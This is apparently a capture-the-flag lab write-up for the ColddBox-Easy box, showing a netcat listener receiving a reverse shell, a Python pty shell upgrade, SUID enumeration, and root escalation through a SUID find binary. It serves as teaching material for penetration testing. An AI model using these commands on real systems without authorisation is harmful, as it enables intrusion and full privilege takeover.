## A classic Python trick to upgrade a shell after exploitation, used in an OffSec CTF: ##

Situation: after the server executed the PHP web shell, I had a terminal on the server without a full TTY:

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.246] from (UNKNOWN) [192.168.249.239] 41574
Linux ColddBox-Easy 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 00:24:15 up  2:36,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
#

I used a Python3 one-liner to upgrade this into a full interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Briefly: this spawns a real pseudo-terminal (PTY) and runs bash inside it, giving job control, tab completion, and command history — none of which the raw shell had.

Output: a proper interactive shell with a full TTY:
www-data@ColddBox-Easy:/$

From there, I escalated to root by finding a misconfigured SUID binary:

www-data@ColddBox-Easy:/$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/bin/su
/bin/ping6
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount 
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/find
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
www-data@ColddBox-Easy:/$ whoami
whoami
www-data
www-data@ColddBox-Easy:/$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
# whoami
whoami
root
#

/usr/bin/find having the SUID bit set was the misconfiguration here- find isn't a binary that should normally carry SUID.
 The -p flag on /bin/sh preserves the elevated privileges instead of dropping them, which is what turns the spawned shell into a root shell.